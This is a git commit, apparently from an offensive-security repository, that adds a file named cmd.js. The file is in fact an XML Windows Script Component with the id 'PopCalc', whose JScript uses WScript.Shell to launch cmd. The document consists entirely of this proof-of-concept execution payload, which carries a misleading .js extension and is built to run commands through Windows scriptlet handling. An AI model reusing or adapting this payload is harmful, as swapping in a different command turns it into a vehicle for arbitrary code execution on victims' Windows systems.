7fac7968b3d9c20b614f2c7fab1f44fdfddf41a5
z3r0c10wn <34138203+z3r0c10wn@users.noreply.github.com>
2022-05-23 16:46:35 +0300

    Add files via upload

---
+++ cmd.js
@@ -0,0 +1,9 @@
+<?xml version="1.0"?>
+<package>
+<component id="PopCalc">
+<script language="JScript">
+<![CDATA[var r = new ActiveXObject("WScript.Shell").Run("cmd");
+]]>
+</script>
+</component>
+</package>
